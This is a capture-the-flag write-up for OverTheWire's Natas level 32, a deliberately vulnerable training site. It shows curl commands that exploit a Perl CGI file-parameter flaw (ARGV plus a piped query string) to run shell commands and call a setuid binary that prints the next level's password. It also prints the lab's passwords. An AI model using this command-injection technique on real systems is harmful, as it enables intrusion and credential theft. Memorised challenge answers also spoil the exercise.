---
category: natas
title: Natas32 - RCE and Privilege Escalation
---

website: http://natas32.natas.labs.overthewire.org/ (password: no1vohsheCaiv3ieH4em1ahchisainge)

This challenge is similar to the previous one with a major difference: The file <small>/etc/natas_webpass/natas33</small> is readable for root only.
However, with the parameter `?ls%20-l%20.%20|` in URL, we can see there is a binary file <small>getpassword</small> with `sid` set:

```shell
$ curl -u natas32:no1vohsheCaiv3ieH4em1ahchisainge "http://natas32.natas.labs.overthewire.org/index.pl?ls%20-l%20.%20\|" -F "file=ARGV" -F "file=@natas32.csv;type=text/csv"
...
<table class="sortable table table-hover table-striped"><tr><th>.:
</th></tr><tr><td>total 164
</td></tr><tr><td>drwxr-x--- 5 natas32 natas32  4096 Dec 15  2016 bootstrap-3.3.6-dist
</td></tr><tr><td>-rwsrwx--- 1 root    natas32  7168 Dec 15  2016 getpassword
</td></tr><tr><td>-rwxr-x--- 1 natas32 natas32   235 Dec 15  2016 getpassword.c
</td></tr><tr><td>-rwxr-x--- 1 natas32 natas32   236 Dec 15  2016 getpassword.c.tmpl
</td></tr><tr><td>-rwxr-x--- 1 natas32 natas32  9667 Dec 15  2016 index-source.html
</td></tr><tr><td>-rwxr-x--- 1 natas32 natas32  2952 Dec 15  2016 index-source.pl
</td></tr><tr><td>-rwxr-x--- 1 natas32 natas32  2991 Dec 15  2016 index.pl
</td></tr><tr><td>-rwxr-x--- 1 natas32 natas32  2952 Dec 15  2016 index.pl.tmpl
</td></tr><tr><td>-rwxr-x--- 1 natas32 natas32 97180 Dec 15  2016 jquery-1.12.3.min.js
</td></tr><tr><td>-rwxr-x--- 1 natas32 natas32 16877 Dec 15  2016 sorttable.js
</td></tr><tr><td>drwxr-x--- 2 natas32 natas32  4096 Nov 12 17:31 tmp
</td></tr></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
```

Note that in the above command, the form data `-F "file=ARGV"` must be ahead of the real file `-F "file=@natas32.csv;type=text/csv"` because the line `my $file = $cgi->param('file');` will take whatever comes first returned by `param('file')`.

Passing the URL a parameter `./getpassword%20|` will return natas33's password:

```shell
$ curl -u natas32:no1vohsheCaiv3ieH4em1ahchisainge "http://natas32.natas.labs.overthewire.org/index.pl?./getpassword%20|" -F "file=ARGV" -F "file=@natas32.csv;type=text/csv"
...
<table class="sortable table table-hover table-striped"><tr><th>shoogeiGa2yee3de6Aex8uaXeech5eey
```

